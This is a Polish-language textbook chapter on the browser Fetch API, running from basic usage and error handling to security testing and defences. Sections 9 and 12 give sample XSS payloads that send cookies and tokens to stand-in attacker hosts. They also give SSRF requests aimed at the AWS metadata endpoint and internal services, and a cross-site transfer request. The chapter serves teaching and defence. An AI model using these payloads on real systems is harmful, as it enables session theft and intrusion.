# Rozdział 11: Fetch API

## 1. Czym jest Fetch API

**Fetch API** to nowoczesny interfejs JavaScript do wykonywania żądań HTTP z przeglądarki. Zastąpił starszy XMLHttpRequest (XHR), oferując czytelniejsze API oparte na Promises zamiast callbacków.

`fetch()` jest globalną funkcją dostępną w przeglądarce i środowiskach opartych na specyfikacji WHATWG Fetch (Node.js 18+, Deno, Cloudflare Workers). Jest częścią **Web API** — nie ECMAScript.

### Podstawowe API

```javascript
fetch(url, options) → Promise<Response>

// options:
{
    method: "GET"|"POST"|"PUT"|"DELETE"|"PATCH"|...,
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data) | FormData | Blob | ReadableStream,
    mode: "cors"|"no-cors"|"same-origin",
    credentials: "omit"|"same-origin"|"include",
    cache: "default"|"no-cache"|"reload"|"force-cache"|"only-if-cached",
    redirect: "follow"|"manual"|"error",
    referrerPolicy: "no-referrer"|"origin"|...,
    integrity: "sha384-...",
    signal: AbortController.signal,
    keepalive: true|false
}
```

### Response Object

```javascript
const response = await fetch(url);

response.status;        // HTTP status code (200, 404, 500...)
response.statusText;    // "OK", "Not Found"...
response.ok;            // true jeśli status 200-299
response.headers;       // Headers object
response.url;           // finalny URL (po redirect)
response.redirected;    // true jeśli nastąpiło przekierowanie
response.type;          // "basic"|"cors"|"opaque"|"error"
response.body;          // ReadableStream

// Metody odczytu body (każda zwraca Promise):
response.text()    // → string
response.json()    // → JavaScript object
response.blob()    // → Blob
response.arrayBuffer() // → ArrayBuffer
response.formData()    // → FormData
```

### Standardy i kompatybilność

Zdefiniowany przez WHATWG Fetch Standard. Dostępny od: Chrome 42 (2015), Firefox 39, Safari 10.1, Edge 14. Node.js 18+ (natywnie).

---

## 2. Dlaczego powstał

### Problem z XMLHttpRequest

XHR (2006) używał callbacków i był trudny w użyciu:

```javascript
// XHR — verbose i nierówne zachowanie między przeglądarkami
var xhr = new XMLHttpRequest();
xhr.open("GET", "/api/data");
xhr.onload = function() {
    if (xhr.status === 200) {
        var data = JSON.parse(xhr.responseText);
        processData(data);
    } else {
        handleError(xhr.status);
    }
};
xhr.onerror = function() { handleNetworkError(); };
xhr.send();
```

### Fetch — Promise-based API

```javascript
// Fetch — czytelne i kompozycyjne
const data = await fetch("/api/data")
    .then(r => {
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        return r.json();
    });
```

### Streaming i zaawansowane możliwości

Fetch API obsługuje:
- Streaming response body (`response.body.getReader()`)
- Streaming request body (`new Request(url, {body: ReadableStream})`)
- AbortController — anulowanie requestów w trakcie
- Keepalive — wysyłanie danych po zamknięciu strony

---

## 3. Jak działa

### Lifecycle żądania Fetch

```
JavaScript: fetch(url, options)
        │
        ▼
1. Validate inputs (URL, headers, method)
        │
        ▼
2. CORS preflight? (jeśli cross-origin + non-simple request)
   OPTIONS request → sprawdza Access-Control-Allow-* nagłówki
        │
        ▼
3. Wyślij właściwy request
   (z credentials jeśli credentials: "include")
        │
        ▼
4. Odbierz nagłówki odpowiedzi
        │
        ▼
5. Utwórz Response object
   (body to ReadableStream — jeszcze nie pobrane!)
        │
        ▼
6. Zwróć Promise<Response> do JS
        │
        ▼ (gdy wywołasz response.json(), response.text() itd.)
7. Odczytaj body z ReadableStream
        │
        ▼
8. Zwróć Promise<T> z danymi
```

### Prosta vs Non-simple request (CORS)

**Simple request** (nie wymaga preflight):
- Metody: GET, HEAD, POST
- Dozwolone nagłówki: Accept, Accept-Language, Content-Language, Content-Type
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain

**Non-simple request** (wymaga preflight OPTIONS):
- Metody: PUT, DELETE, PATCH, itd.
- Custom headers: Authorization, X-Custom-Header, itd.
- Content-Type: application/json

### credentials — kiedy wysyłane są cookies

```javascript
// Domyślnie: credentials: "same-origin"
fetch("/api/data"); // cookies wysyłane tylko do tego samego origin

// credentials: "include" — wysyłaj cookies też cross-origin
fetch("https://api.example.com/data", { credentials: "include" });
// UWAGA: serwer musi mieć Access-Control-Allow-Credentials: true
// i Access-Control-Allow-Origin NIE może być "*"

// credentials: "omit" — nie wysyłaj cookies nigdy
fetch("/api/public", { credentials: "omit" });
```

### Obsługa błędów — pułapka

```javascript
// PUŁAPKA: fetch NIE rzuca błędu przy HTTP 4xx/5xx!
try {
    const response = await fetch("/api/data");
    // response.ok = false dla 404, 500 etc. — ale nie rzuca!
    const data = await response.json();
    // data może być komunikatem błędu, nie danymi
} catch (e) {
    // Złapany TYLKO dla błędów sieci (brak połączenia, CORS error)
    // NIE dla HTTP 404, 500, itd.
}

// Poprawny wzorzec:
async function safeFetch(url, options) {
    const response = await fetch(url, options);
    if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    return response;
}
```

### AbortController — anulowanie requestu

```javascript
const controller = new AbortController();

// Anuluj po 5 sekundach
const timeout = setTimeout(() => controller.abort(), 5000);

try {
    const response = await fetch("/api/slow-endpoint", {
        signal: controller.signal
    });
    clearTimeout(timeout);
    return await response.json();
} catch (e) {
    if (e.name === "AbortError") {
        console.log("Request anulowany");
    }
}
```

---

## 4. Co dzieje się wewnętrznie

### ServiceWorker interception

Jeśli strona ma zarejestrowanego Service Workera, każdy `fetch()` jest przechwytywany:

```javascript
// W Service Worker:
self.addEventListener('fetch', event => {
    // event.request to pełny Request object
    event.respondWith(
        caches.match(event.request) || fetch(event.request)
    );
});
```

To kluczowe dla bezpieczeństwa — SW może modyfikować każdy request i response.

### ReadableStream — streaming

Response body to ReadableStream — dane mogą być przetwarzane podczas pobierania:

```javascript
const response = await fetch("/api/large-file");
const reader = response.body.getReader();

while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    processChunk(value); // Uint8Array
}
```

### Request duplikacja

Response body można odczytać **tylko raz**. Po wywołaniu `response.json()` nie możesz wywołać `response.text()`:

```javascript
const response = await fetch("/api");
await response.json(); // OK
await response.text(); // TypeError: body already read

// Jeśli chcesz odczytać wielokrotnie:
const clone = response.clone(); // klonuj przed pierwszym odczytem
const json = await response.json();
const text = await clone.text();
```

---

## 5. Analogiczny przykład z życia

Fetch API to korespondencja listowa:

- **`fetch(url, options)`** = wysłanie listu (opcje jak poleconą, priorytetową, zwrotną)
- **Preflight** = wcześniejsze zapytanie "czy mogę wysłać paczce?" (CORS)
- **`response.ok`** = czy list dotarł i odpowiedź jest pozytywna
- **`response.json()`** = otworzenie koperty i odczytanie treści
- **AbortController** = cofnięcie listu ze skrzynki
- **credentials: "include"** = załączenie dowodu tożsamości do każdego listu (cookies)

---

## 6. Przykład kodu

```javascript
// Kompletny przykład z obsługą błędów, autoryzacją, AbortController

async function fetchUserProfile(userId) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 10000); // 10s timeout
    
    try {
        // Wysyłamy request z:
        // - Authorization header (token z localStorage — uwaga: XSS!)
        // - credentials: "same-origin" (domyślnie — wysyła cookies dla tego samego origin)
        // - Content-Type dla JSON body
        const response = await fetch(`/api/users/${encodeURIComponent(userId)}`, {
            method: "GET",
            headers: {
                "Authorization": `Bearer ${localStorage.getItem("token")}`,
                "Accept": "application/json",
                "X-Requested-With": "XMLHttpRequest" // marker AJAX request
            },
            credentials: "same-origin", // wyślij cookies dla tego samego origin
            signal: controller.signal
        });
        
        clearTimeout(timeout);
        
        // fetch nie rzuca dla HTTP 4xx/5xx — sprawdzamy ręcznie
        if (response.status === 401) {
            // Token wygasł — redirect do logowania
            window.location.href = "/login";
            return null;
        }
        
        if (response.status === 403) {
            throw new Error("Brak uprawnień");
        }
        
        if (!response.ok) {
            throw new Error(`Błąd serwera: ${response.status}`);
        }
        
        // Odczytaj body jako JSON
        const contentType = response.headers.get("Content-Type");
        if (!contentType?.includes("application/json")) {
            throw new Error("Nieoczekiwany format odpowiedzi");
        }
        
        return await response.json();
        
    } catch (error) {
        if (error.name === "AbortError") {
            throw new Error("Timeout — serwer nie odpowiedział w czasie 10 sekund");
        }
        throw error; // rethrow inne błędy
    }
}

// Użycie:
try {
    const user = await fetchUserProfile("alice");
    displayUser(user);
} catch (e) {
    showError(e.message);
}
```

---

## 7. Przykład z prawdziwej aplikacji

### Aplikacja bankowa — transfer z CSRF protection

```javascript
// Bezpieczny transfer z CSRF tokenem
async function initiateTransfer(toAccount, amount) {
    // CSRF token z meta tagu (nie z JS — bezpieczniejsze względem XSS)
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
    
    const response = await fetch("/api/transfers", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "X-CSRF-Token": csrfToken,
            "Authorization": `Bearer ${getAuthToken()}`
        },
        credentials: "same-origin", // wysyła session cookie
        body: JSON.stringify({
            to: toAccount,
            amount: amount,
            currency: "PLN"
        })
    });
    
    if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
    }
    
    return response.json();
}
```

### SPA z interceptorem (Axios-like pattern)

```javascript
// Globalny interceptor — dodaje auth do każdego requestu
class ApiClient {
    #baseUrl;
    #token;
    
    constructor(baseUrl) {
        this.#baseUrl = baseUrl;
    }
    
    async #request(path, options = {}) {
        const url = new URL(path, this.#baseUrl);
        
        const headers = {
            "Content-Type": "application/json",
            ...options.headers
        };
        
        if (this.#token) {
            headers["Authorization"] = `Bearer ${this.#token}`;
        }
        
        const response = await fetch(url, {
            ...options,
            headers,
            credentials: "same-origin"
        });
        
        // Auto-refresh token przy 401
        if (response.status === 401 && !options._retry) {
            await this.#refreshToken();
            return this.#request(path, { ...options, _retry: true });
        }
        
        if (!response.ok) {
            throw await this.#parseError(response);
        }
        
        return response.json();
    }
    
    get(path) { return this.#request(path); }
    post(path, data) { 
        return this.#request(path, { method: "POST", body: JSON.stringify(data) }); 
    }
}
```

---

## 8. Typowe błędy programistów

### Błąd 1: Nie sprawdzanie response.ok

```javascript
// BŁĄD: zakłada że fetch zawsze zwraca dane
const data = await fetch("/api/user").then(r => r.json());
// Jeśli server zwróci 500 z HTML error page → JSON.parse rzuci błąd

// POPRAWKA:
const response = await fetch("/api/user");
if (!response.ok) throw new Error(`${response.status}`);
const data = await response.json();
```

### Błąd 2: Token w URL zamiast nagłówka

```javascript
// BŁĄD: token w URL → zapisywany w logach, Referer, history
const data = await fetch(`/api/data?token=${authToken}`);

// POPRAWKA: Authorization header
const data = await fetch("/api/data", {
    headers: { "Authorization": `Bearer ${authToken}` }
});
```

### Błąd 3: Brak timeout

```javascript
// BŁĄD: bez timeout request może wisieć wiecznie
const data = await fetch("/api/slow");

// POPRAWKA: AbortController z timeout
const ctrl = new AbortController();
setTimeout(() => ctrl.abort(), 10000);
const data = await fetch("/api/slow", { signal: ctrl.signal });
```

### Błąd 4: Włączone credentials cross-origin bez weryfikacji

```javascript
// BŁĄD: wysyłanie cookies do niezaufanego API
const data = await fetch("https://external-api.com/data", {
    credentials: "include" // wysyła cookies do external-api.com!
});
// Jeśli ta domena jest przejęta → CSRF!
```

---

## 9. Znaczenie dla bezpieczeństwa

### Fetch i CORS — fundamentalna ochrona

Przeglądarka automatycznie blokuje cross-origin fetch bez odpowiednich nagłówków CORS. To chroni przed CSRF i kradzieżą danych. (Szczegóły w rozdziale 13 — CORS.)

### XSS + fetch = exfiltracja danych

Fetch jest głównym wektorem eksfiltracji danych w atakach XSS:

```javascript
// Payload XSS — eksfiltracja przez fetch
fetch("https://evil.com/steal", {
    method: "POST",
    body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: window.location.href
    }),
    mode: "no-cors" // obejście CORS dla eksfiltracji (nie można odczytać response)
});
```

**`mode: "no-cors"`** pozwala na wysłanie requestu do dowolnej domeny bez preflightu, ale nie można odczytać odpowiedzi. Wystarczy do eksfiltracji.

### SSRF (Server-Side Request Forgery)

Jeśli backend używa danych z klienta do budowania URL fetch po stronie serwera:

```javascript
// Backend (Node.js) — podatny na SSRF
app.post("/proxy", async (req, res) => {
    const targetUrl = req.body.url; // URL z klienta
    const response = await fetch(targetUrl); // SSRF!
    res.send(await response.text());
});

// Atakujący wysyła: {"url": "http://169.254.169.254/latest/meta-data/"}
// → dostęp do AWS metadata endpoint (IMDS)
```

**CWE-918** — Server-Side Request Forgery

### Fetch i SameSite Cookies

Fetch z `credentials: "include"` wysyła cookies. Jednak nowoczesne przeglądarki z SameSite=Strict lub SameSite=Lax blokują cookies w cross-site requestach (szczegóły w rozdziałach 14 i 40).

### Powiązane CWE

- **CWE-918** — SSRF
- **CWE-601** — Open Redirect (przez redirected response)
- **CWE-79** — XSS (fetch jako eksfiltracja)
- **CWE-352** — CSRF (gdy credentials nie chronione)

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Network

1. Otwórz **Network** (Ctrl+Shift+J → Network)
2. Filtruj: `Fetch/XHR` — widzisz tylko fetch requesty
3. Kliknij request → sprawdź:
   - **Headers**: Authorization, X-CSRF-Token, Custom Headers
   - **Payload**: jakie dane są wysyłane? Czy są wrażliwe?
   - **Response**: co serwer zwraca? Czy są wrażliwe dane?
   - **Cookies**: jakie cookies są wysyłane?

### Przechwycenie fetch w konsoli

```javascript
// Monkey-patch fetch — przechwytuj wszystkie requesty (w DevTools Console)
const originalFetch = window.fetch;
window.fetch = function(...args) {
    console.log("fetch:", args[0], args[1]);
    return originalFetch.apply(this, args)
        .then(response => {
            console.log("response:", response.status, response.url);
            return response;
        });
};

// Teraz każde wywołanie fetch będzie logowane
```

### Szukanie sensitive data w requestach

W Burp Suite:
- **Proxy → HTTP History** → filtruj `fetch`
- Szukaj w headers: `Authorization:`, `X-Auth-Token:`, `Cookie:`
- Szukaj w body: `password`, `token`, `secret`, `key`, `card`

### Sprawdzanie mode i credentials

```javascript
// W Sources — szukaj niebezpiecznych wzorców:
// mode: "no-cors" — pozwala na eksfiltrację bez CORS
// credentials: "include" — wysyła cookies cross-origin
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy wrażliwe dane (tokeny, hasła) są wysyłane przez fetch w URL zamiast nagłówkach?
□ Czy serwer zwraca wrażliwe dane w response body bez weryfikacji uprawnień?
□ Czy CSRF protection jest implementowana (token w nagłówkach)?
□ Czy credentials: "include" jest używane tylko dla zaufanych origin?
□ Czy mode: "no-cors" jest używane (blokuje odczyt response, ale pozwala na eksfiltrację)?
□ Czy backend nie używa URL z klienta do fetch po stronie serwera (SSRF)?
□ Czy response nagłówki zawierają CORS: Access-Control-Allow-Origin: *?
□ Czy timeouty są implementowane (brak → możliwe DoS)?
□ Czy błędy serwera ujawniają wrażliwe informacje w response body?
□ Czy integrity (SRI) jest weryfikowane dla krytycznych zasobów?
□ Czy refresh token endpoint jest odpowiednio chroniony?
□ Czy keepalive: true pozwala na wysłanie danych po opuszczeniu strony?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: SSRF przez fetch proxy

**Wymagania:** Backend ma endpoint który proxy'uje requesty do URL podanego przez klienta.

**Przebieg:**
```bash
# Standardowy request
POST /api/fetch-preview
{"url": "https://example.com"}

# SSRF payload — AWS metadata
POST /api/fetch-preview
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

# SSRF payload — lokalne serwisy
POST /api/fetch-preview
{"url": "http://localhost:6379"}  # Redis
{"url": "http://localhost:27017"} # MongoDB
{"url": "http://internal-api/admin"} # wewnętrzne API
```

**Ochrona:** Whitelist dozwolonych domen, blokada IP prywatnych, metadanych cloud.

### Scenariusz 2: Eksfiltracja przez XSS + mode:no-cors

**Wymagania:** XSS na stronie ofiary.

**Przebieg:**
```javascript
// Payload XSS
fetch("https://attacker.com/collect", {
    method: "POST",
    mode: "no-cors",          // nie potrzeba CORS dla eksfiltracji
    body: new URLSearchParams({
        token: localStorage.getItem("authToken"),
        cookies: document.cookie,
        page: location.href
    })
});
```

**Dlaczego `no-cors` działa:** Request jest wysyłany (dane wychodzą), ale response jest zablokowany. Do eksfiltracji nie potrzeba odczytywać response.

### Scenariusz 3: CSRF przez fetch bez ochrony

**Wymagania:** Endpoint zmienia stan użytkownika bez CSRF tokenu, a cookies są SameSite=None.

**Przebieg:**
```javascript
// Na evil.com — ofiara odwiedza stronę atakującego
fetch("https://bank.com/api/transfer", {
    method: "POST",
    credentials: "include",  // wyśle cookies ofiary
    body: JSON.stringify({ to: "attacker", amount: 10000 }),
    headers: { "Content-Type": "application/json" }
});
```

---

## 13. Jak się zabezpieczać

### CSRF Protection

```javascript
// Frontend — zawsze wysyłaj CSRF token
async function apiRequest(url, data) {
    const csrfToken = document.querySelector('[name=csrf-token]')?.content;
    
    return fetch(url, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "X-CSRF-Token": csrfToken  // serwer weryfikuje ten nagłówek
        },
        credentials: "same-origin",
        body: JSON.stringify(data)
    });
}
```

```javascript
// Backend — weryfikuj CSRF token
app.use((req, res, next) => {
    if (["POST", "PUT", "DELETE", "PATCH"].includes(req.method)) {
        const token = req.headers["x-csrf-token"];
        if (!csrfStore.verify(req.session.id, token)) {
            return res.status(403).json({ error: "CSRF token invalid" });
        }
    }
    next();
});
```

### SSRF Protection

```javascript
// Whitelist dozwolonych domen + blokada prywatnych IP
const allowedHosts = ["api.partner.com", "cdn.example.com"];

async function safeProxy(url) {
    const parsed = new URL(url);
    
    if (!allowedHosts.includes(parsed.hostname)) {
        throw new Error("Unauthorized hostname");
    }
    
    // Dodatkowe: DNS resolution check dla prywatnych IP
    const { address } = await dns.lookup(parsed.hostname);
    const privateRanges = [/^10\./, /^172\.(1[6-9]|2\d|3[01])\./, /^192\.168\./];
    if (privateRanges.some(r => r.test(address))) {
        throw new Error("Private IP range blocked");
    }
    
    return fetch(url);
}
```

### Response Validation

```javascript
// Zawsze waliduj strukturę odpowiedzi
async function fetchUser(id) {
    const response = await fetch(`/api/users/${encodeURIComponent(id)}`);
    
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    
    const contentType = response.headers.get("content-type");
    if (!contentType?.includes("application/json")) {
        throw new Error("Expected JSON response");
    }
    
    const data = await response.json();
    
    // Walidacja struktury
    if (typeof data.id !== "string" || typeof data.name !== "string") {
        throw new Error("Invalid response structure");
    }
    
    return data;
}
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. Fetch API to Promise-based API do HTTP — zastępuje XHR
2. `fetch()` NIE rzuca błędów dla HTTP 4xx/5xx — sprawdzaj `response.ok`
3. CORS kontroluje cross-origin fetch — credentials: "include" wysyła cookies
4. `mode: "no-cors"` pozwala na wysłanie (eksfiltrację) bez odczytania response
5. Fetch z zewnętrznym URL po stronie serwera = potencjalny SSRF

**Najczęstsze nieporozumienia:**

- "Fetch rzuca błąd gdy serwer zwróci 500" — NIE. Rzuca tylko dla błędów sieci i CORS.
- "credentials: include wysyła login/hasło" — NIE. Wysyła cookies i cert klienta. Nie wysyła Authorization header automatycznie — to musisz dodać ręcznie.
- "mode: no-cors blokuje eksfiltrację" — NIE. Blokuje odczytanie response, ale request jest wysyłany.

---

## Jak rozpoznać w prawdziwej aplikacji

1. **DevTools → Network** → filtr `Fetch/XHR` → każdy request widoczny z headers i body
2. **Sources → Ctrl+Shift+F** → `fetch(` → znajdź wszystkie wywołania
3. **Burp Proxy** → przechwytuj i modyfikuj fetch requesty w locie
4. **Console** → monkey-patch `fetch` → loguj wszystkie wywołania

---

## Powiązania

```
Fetch API
        │
        ├──► XMLHttpRequest (Rozdział 12)
        │         Fetch to następca XHR — podobne bezpieczeństwo, lepsze API
        │
        ├──► CORS (Rozdział 13)
        │         CORS kontroluje które cross-origin fetche są dozwolone
        │
        ├──► Cookies (Rozdział 14)
        │         credentials: "include/same-origin" kontroluje wysyłanie cookies
        │
        ├──► Service Workers (Rozdział 19)
        │         SW przechwytuje i może modyfikować każdy fetch
        │
        ├──► CSP (Rozdział 36)
        │         connect-src w CSP kontroluje do jakich URL możemy fetch
        │
        └──► Fetch Metadata Headers (Rozdział 39)
                  Nagłówki Sec-Fetch-* opisują kontekst każdego fetcha
```
